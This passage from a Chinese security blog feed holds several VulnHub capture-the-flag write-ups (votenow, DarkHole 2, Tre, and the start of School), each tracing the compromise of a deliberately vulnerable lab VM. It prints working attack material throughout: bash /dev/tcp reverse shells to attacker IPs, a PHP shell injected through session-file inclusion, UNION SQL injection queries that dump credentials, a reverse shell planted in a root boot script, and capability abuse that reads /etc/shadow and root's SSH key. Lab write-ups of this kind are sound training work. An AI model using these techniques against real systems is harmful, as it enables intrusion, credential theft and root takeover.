<p>接着，包含session所在文件，这里就是该靶机的一个大坑，那就是要把sessions改成session！！！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_vh95pitq4hv51ijj1b6g83o8afetposj</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222507.png" /></p>
<p>可以看到phpinfo被成功执行。</p>
<p>那么，我们构造如下反弹shell的paylaod： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php system(&quot;bash -i &gt;&amp; /dev/tcp/10.0.2.27/4444 0&gt;&amp;1&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222959.png" /></p>
<p>kali监听444端口，浏览器再次访问之前的session文件。session会过期的，如果原来的session文件不能反弹shell，可以查看session是否改变了，一般来说没这么快，只有重新登陆的时候才会改变</p>
<blockquote>
<p>如果直接在后面输入index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_vh95pitq4hv51ijj1b6g83o8afetposj则可以反弹；但是如果把域名都加进去则不行，此时需要重新登录刷新一下session，然后再次执行sql语句，接着包含session文件。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506223218.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>查看/etc/passwd <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:998:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">admin:x:1000:1000::/home/admin:/bin/bash</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br></pre></td></tr></table></figure></p>
<p>看到了admin，想到刚刚还破解了密码，但无法ssh登录，尝试直接切换用户</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506223922.png" /></p>
<p>利用python将shell简单升级下。</p>
<p>接下来进行信息收集，利用工具，发现系统内核比较老，因此先后尝试了3.4个内核漏洞，包括脏牛在内的漏洞都无法使用。感觉作者并不想让我们通过内核漏洞提权。</p>
<p>又依次搜索了suid, sudo, crontab, 可疑进程，都没有可以利用的点。又思考了下，想到了之前曾用过依次的capabilities提权，输入如下命令查看： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506224249.png" /></p>
<p>依次查看这些文件的权限，知道查看到/usr/bin/tarS， <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwx------. 1 admin admin 346136 Jun 27  2020 /usr/bin/tarS</span><br></pre></td></tr></table></figure></p>
<p>只有这个是admin可以执行的，因此，我们先切换到家目录（权限最大），然后尝试执行文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506224502.png" /></p>
<p>这好像就是tar命令。我又去搜索了下 cap_dac_read_search+ep 的作用，该权限可以无视DAC权限（简单来说就是我们查看文件权限前面设置的哪些rwx）。</p>
<p><strong>换句话说，如果我们使用tarS命令，就可以无视任何权限限制，压缩任何文件，并解压</strong>。并且家目录下的notes.txt也应证了这一点 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[admin@votenow ~]$ cat notes.txt</span><br><span class="line">cat notes.txt</span><br><span class="line">Reminders:</span><br><span class="line"></span><br><span class="line">1) Utilise new commands to backup and compress sensitive files</span><br></pre></td></tr></table></figure></p>
<p>首先想到的就是读取/etc/shadow，然后破解root的密码： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. tarS -cvf shadow.tar /etc/shadow</span><br><span class="line">2. tarS -xvf shadow</span><br><span class="line">3. <span class="built_in">cd</span> etc <span class="comment"># 千万别 + /</span></span><br><span class="line">4. chmod 700 shadow</span><br><span class="line">5. cat shadow</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225201.png" /></p>
<p>不说这个root密码用john爆破得不到结果。</p>
<p>接着又思考了一下，想到了ssh只允许公钥认证登录，因此只要我们有/root/.ssh/id_rsa就可以登录。（并不知道是否存在，只是尝试） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> ~</span><br><span class="line">2. tarS -cvf s.tar /root/.ssh/id_rsa</span><br><span class="line">3. tarS -xvf s.tar</span><br><span class="line">4. <span class="built_in">cd</span> root/.ssh</span><br><span class="line">5. chmod 600 id_rsa</span><br><span class="line">6. ssh root@<span class="built_in">local</span> -i id_rsa -p 2082</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506225636.png" /></p>
<p>最后，读取2个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/admin/user.txt</span><br><span class="line">663ba6a402a57536772c6118e8181570</span><br><span class="line"></span><br><span class="line">2. /root/root-final-flag.txt</span><br><span class="line">Congratulations on getting root.</span><br><span class="line"></span><br><span class="line"> _._     _,-&#x27;&quot;&quot;`-._</span><br><span class="line">(,-.`._,&#x27;(       |\`-/|</span><br><span class="line">    `-.-&#x27; \ )-`( , o o)</span><br><span class="line">          `-    \`_`&quot;&#x27;-</span><br><span class="line"></span><br><span class="line">This CTF was created by bootlesshacker - https://security.caerdydd.wales</span><br><span class="line"></span><br><span class="line">Please visit my blog and provide feedback - I will be glad to hear from you.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>通过该靶机的渗透，我总结了提权的时候查看的顺序：</p>
<ol type="1">
<li>/etc/passwd -&gt; 看用户</li>
<li>uname -a -&gt; 看内核、版本</li>
<li>sudo -l</li>
<li>suid</li>
<li>查看.bash_history</li>
<li>查看进程、端口</li>
<li>capabilities</li>
<li>其他</li>
</ol>
<p>个人意见！！！</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>phpmyadmin漏洞</tag>
        <tag>capabilities提权</tag>
      </tags>
  </entry>
  <entry>
    <title>25 Vulnhub Dark_Hole_2 Writeup</title>
    <url>/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/</url>
    <content><![CDATA[<p>该靶机作者给出的难度是高，但我认为达不到高难度。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/darkhole-2,740/">DarkHole: 2 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>高（个人感觉达不到高难度）</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>.git库泄露</strong></li>
<li>源码分析</li>
<li>sql注入</li>
<li><strong>本地端口转发</strong></li>
<li>密码爆破</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.22</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.22</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507113549.png" /></p>
<p>注意http服务上存在/.git/，以为着80端口可能有<strong>.git库泄露</strong></p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>直接访问80端口，页面上只有一个功能点，那就是login，但是现在还不知道邮箱和密码。</p>
<p>将.git库下载到本地，直接使用wget，我利用githack得不到log消息。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -r http://192.168.100.22/.git/ <span class="comment"># r 递归下载</span></span><br></pre></td></tr></table></figure></p>
<p>得到以IP命名的文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> 192.168.100.22</span><br><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507114533.png" /></p>
<p>因此，将版本会退回a4d9....，然后查看login.php <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</span><br><span class="line">cat login.php</span><br></pre></td></tr></table></figure></p>
<p>从中找到了邮箱和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email: lush@admin.com</span><br><span class="line">password: 321</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>然后回到登陆界面登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507114821.png" /></p>
<p>注意到url中有一个id=1，先测试是否存在sql注入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; # 白屏</span><br><span class="line">?id=1&#x27;--+ # 正常</span><br></pre></td></tr></table></figure></p>
<p>因此存在SQL注入的漏洞，接下来就是常规的联合注入的过程。有一点不同的是，<strong>之前在判断字段数的时候，order by后面的数字和字段数不同都会错误，只有相同才不会出错。而该靶机当数字&lt;=字段数的时候不出错，数字&gt;字段数的时候出错</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 6--+</span></span><br><span class="line"><span class="string">2. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="number">3.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,user(),version(),4,@@basedir,database()--+</span></span><br><span class="line"><span class="string">4. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="number">5.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ssh<span class="string">&#x27;),3,4,5,6--+</span></span><br><span class="line"><span class="string">6. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,id,<span class="keyword">user</span>,<span class="number">4</span>,pass,<span class="number">6</span> <span class="keyword">from</span> ssh<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>该数据库下还有其他信息，我都收集了，但是有用的就是ssh的账号和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: jehad</span><br><span class="line">password: fool</span><br></pre></td></tr></table></figure></p>
<p>直接ssh远程连接： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh jehad@192.168.100.22</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507115951.png" /></p>
<h2 id="水平移动">2.4. 水平移动</h2>
<p>首先查看用户： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jehad@darkhole:~$ cat /etc/passwd|grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">lama:x:1000:1000:darkhole:/home/lama:/bin/bash</span><br><span class="line">jehad:x:1001:1001:,,,:/home/jehad:/bin/bash</span><br><span class="line">losy:x:1002:1002:,,,:/home/losy:/bin/bash</span><br></pre></td></tr></table></figure></p>
<h3 id="losy">2.4.1. losy</h3>
<p>进行了必要的收集之后，在/home/jehad/.bash_history中发现了重要的信息（节选） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> losy</span><br><span class="line">cat authorized_keys</span><br><span class="line">cat id_rsa</span><br><span class="line">cat id_rsa.pub </span><br><span class="line">cat authorized_keys </span><br><span class="line">touch authorized_kyes</span><br><span class="line">ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129</span><br><span class="line">curl <span class="string">&quot;http://localhost:9999/?cmd=id&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>原本以为losy可以利用公钥认证登录，但是被删除了。又注意到9999端口下可能存在着命令执行，因此查看该端口上执行的进程</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507120439.png" /></p>
<p>/opt/web目录下有一个index.php，内容如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Parameter GET[&#x27;cmd&#x27;]&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>很显然存在命令执行，于是我先尝试了/home/jehad/.bash_history里面的反弹shell的命令，但是行不通，于是使用如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.100.10/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>将其进行url编码</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507121853.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://127.0.0.1:9999/?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27          </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507121921.png" /></p>
<h3 id="lama">2.4.2. lama</h3>
<p>直接使用MidPwds.txt字典爆破即可</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507122828.png" /></p>
<h2 id="权限提升">2.5. 权限提升</h2>
<p>如果之前权限为losy，那么还是先检查/home/losy/.bash_history，注意到：</p>
<ol type="1">
<li>有一个密码 gang</li>
<li>sudo -l</li>
<li>以及python反弹shell的命令</li>
</ol>
<p>直接执行sudo -l，失败了，尝试ssh登录losy，密码为gang，成功！接着sudo -l</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123135.png" /></p>
<p>接下来就很简单了： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123229.png" /></p>
<p>如果之前得到lama的权限，就更简单了。同样查看sudo -l</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123307.png" /></p>
<p>直接切换成root即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123338.png" /></p>
<p>最后，读取两个flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/losy/user.txt</span><br><span class="line">DarkHole&#123;&#x27;This_is_the_life_man_better_than_a_cruise&#x27;&#125;</span><br><span class="line"></span><br><span class="line">2. /root/root.txt</span><br><span class="line">DarkHole&#123;&#x27;Legend&#x27;&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="番外">3. 番外</h1>
<p>其实在get shell的时候除了使用curl，还可以使用ssh，/home/jehad/.bash_history里面也涉及到了： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L &lt;localport&gt;:&lt;remotethost&gt;:&lt;remotepost&gt; &lt;hostname@ip&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>本地转发</strong>：作用就是将本机的某个端口映射到远程主机的端口。这样远程主机就能通过对应的端口访问本机端口上的服务。</p>
<p>因此，该靶机中可以如此： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali: ssh -L 9999:localhost:9999 jehad@192.168.100.22</span><br></pre></td></tr></table></figure></p>
<p>解释：对于靶机来说，kali就是远程主机。因为是在kali上运行该命令，于是remotethost = localhost。这样子，就能够在kali的9990端口上访问靶机的9999端口。</p>
<p>然后浏览器访问: 127.0.0.1:9999</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507133252.png" /></p>
<p>直接输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27   </span><br></pre></td></tr></table></figure></p>
<p>即可反弹shell。</p>
<h1 id="总结">4. 总结</h1>
<p>对该靶机的渗透，有以下新的知识点：</p>
<ol type="1">
<li>.git 泄露</li>
<li>利用ssh进行本地端口转发</li>
<li>.bash_history一定要看！</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>本地端口转发</tag>
        <tag>.git库泄露</tag>
        <tag>.bash_history</tag>
      </tags>
  </entry>
  <entry>
    <title>27 Vulnhub Tre Writeup</title>
    <url>/2022/05/08/27%20Vulnhub%20Tre%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/tre-1,483/">Tre: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>进阶路径枚举</strong></li>
<li>exp代码改造</li>
<li>边界突破（3种方法）</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.23</span><br><span class="line">sudo nmap -p22,80,8082 -A 192.168.100.23</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507224231.png" /></p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>经尝试，80端口和8082端口的内容是一样的，都很干净，源码也没有有用的信息。那么接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.23/</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507224429.png" /></p>
<p>首先打开了adminer.php，这看过去像是数据库管理后台，但是我们现在还未获得任何和数据库有关的信息，所以先放着。我也尝试搜索了以下adminer的漏洞，但靶机所使用的版本比较新，并没有可以利用的漏洞。</p>
<p>接下来看了一下system目录，从401可以看出需要进行认证，但好在存在弱口令，admin:admin 即可绕过。</p>
<p>进入之后，这还是一个登录界面，这里就没有弱口令了。接下来对system这个路径接着扫描： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.23/system --header=<span class="string">&quot;Authorization&quot;</span>:<span class="string">&quot;Basic Authorization: Basic YWRtaW46YWRtaW4=&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>请求头的信息可以从抓包看到</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507225055.png" /></p>
<p>将其base64解码就是 admin:admin</p>
<p>这回扫出了很多东西，尤其看到config的时候，直接访问该目录，有一个文档文件，重要内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --- Database Configuration ---</span><br><span class="line">$g_hostname      = &#x27;localhost&#x27;;</span><br><span class="line">$g_db_username   = &#x27;mantissuser&#x27;;</span><br><span class="line">$g_db_password   = &#x27;password@123AS&#x27;;</span><br><span class="line">$g_database_name = &#x27;mantis&#x27;;</span><br><span class="line">$g_db_type       = &#x27;mysqli&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>这是数据库的相关信息。</p>
<p>其实使用下面的命令，不用添加认证信息都可以扫出来config <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.100.23/ /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<h3 id="方法1">2.3.1. 方法1</h3>
<p>搜索 mantis 的漏洞</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507225817.png" /></p>
<p>由于不知道其版本号，因此采用最新的。从最后的RCE开始。需要加exp稍作修改（端口可以不用改）这里最好有mousepad进行修改，如果使用vim，会导致缩进有问题</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074652.png" /></p>
<p>该漏洞可以直接反弹shell。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074725.png" /></p>
<p>执行虽然报错了，但是已经反弹会shell了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074746.png" /></p>
<h3 id="方法2">2.3.2. 方法2</h3>
<p>利用 mantis 的 Password Reset 漏洞。简单来说就是在mantis的verify.php界面如果带上 <code>?id=1&amp;confirm_hash=</code>，就可以不用登录直接跳到administrator修改用户信息的界面 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.100.23/system/verify.php?id=1&amp;confirm_hash=</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507233355.png" /></p>
<p>修改完密码直接登录即可，注意用户名是administrator，不是XiBejMub，这个是realname。</p>
<p>然后从Manage Users中看到了如下消息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507233530.png" /></p>
<p>接下来直接ssh登录即可，具体可以看[[#2 3 3 方法3]]</p>
<h3 id="方法3">2.3.3. 方法3</h3>
<p>利用得到的数据库信息登录最开始的adminer。查看用户信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507230751.png" /></p>
<p>（最后一个用户是测试功能的时候注册的）</p>
<p>红色方框不像是一个realname，猜测可能是密码，直接使用ssh连接</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507230928.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>在查看sudo -l的时候发现可以不用密码执行shutdown，也就是关机的命令。接下来找可以的文件，其实也可以找进程： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -o=w -user root -ls 2&gt;/dev/null|grep -v proc|grep -v /sys/fs/cgroup</span><br><span class="line"></span><br><span class="line">ps -aux|grep root <span class="comment"># 这也可以</span></span><br></pre></td></tr></table></figure></p>
<p>找到一个可疑的文件 /usr/bin/check-system，文件内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`</span><br><span class="line">echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p info</span><br><span class="line"></span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">echo &quot;Checking...&quot;;</span><br><span class="line">sleep 1;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>那么这个进程是什么时候被执行的呢？ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -Ri <span class="string">&quot;check-system&quot;</span> /etc 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507231843.png" /></p>
<p>从中可以看到操作系统启动的时候就会执行check-system，配合刚刚sudo -l发现的shutdown指令，思路就很清晰了。</p>
<p>首先往里面编写反弹shell的指令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DATE=`date <span class="string">&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Service started at <span class="variable">$&#123;DATE&#125;</span>&quot;</span> | systemd-cat -p info</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Checking...&quot;</span>;</span><br><span class="line">sleep 1;</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.100.10/5555 0&gt;&amp;1;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>一定要加入到循环内，否则可能会没有效果。在循环内可以每1秒执行一次，能够保证反弹shell。</p>
<p>接着，kali监听5555端口 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure></p>
<p>最后，执行重启 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/shutdown -r now <span class="comment"># -r: 重启 now: 立刻</span></span><br></pre></td></tr></table></figure></p>
<p>等待一段时间之后</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507232533.png" /></p>
<p>接下来就可以读取flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt</span><br><span class="line">&#123;SunCSR_Tr3_Viet_Nam_2020&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="番外">3. 番外</h1>
<p>权限提升的时候，利用方式可以很多样。比如还可以往循环内写入： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +s /usr/bin/vi</span><br></pre></td></tr></table></figure></p>
<p>然后重启。再次利用ssh登录，此时vi就获得了suid，而vi属主一般都是root，因此，就可以利用vi去修改/etc/passwd，不论是修改root密码，还是新建用户，按道理都是可以的，不过我尝试之后失败了。不过有人成功了。（疑问：添加了一个用户或者将root的密码那里去掉，亦或者修改root的密码都不行，不知道为什么）</p>
<ul>
<li><a href="https://www.hackingarticles.in/tre1-vulnhub-walkthrough/">Tre:1 Vulnhub Walkthrough - Hacking Articles</a></li>
</ul>
<p>还可以给find加上suid</p>
<ul>
<li><a href="https://www.hacknos.com/tre-vulnhub-walkthrough/">Tre Vulnhub Walkthrough - HackNos tre: 1 walkthrough</a></li>
</ul>
<h1 id="总结">4. 总结</h1>
<p>该靶机get shell方式比较多，还用到了带头部的路径扫描。</p>
<p>在权限提升的时候，利用对可疑程序/进程的修改，从而提权。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>漏洞搜索</tag>
        <tag>exp修改</tag>
        <tag>可疑进程提权</tag>
      </tags>
  </entry>
  <entry>
    <title>26 Vulnhub School Writeup</title>
    <url>/2022/05/07/26%20Vulnhub%20School%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，不过搭建Windows环境确实挺恶心的。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/school-1,613/">School: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>高</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
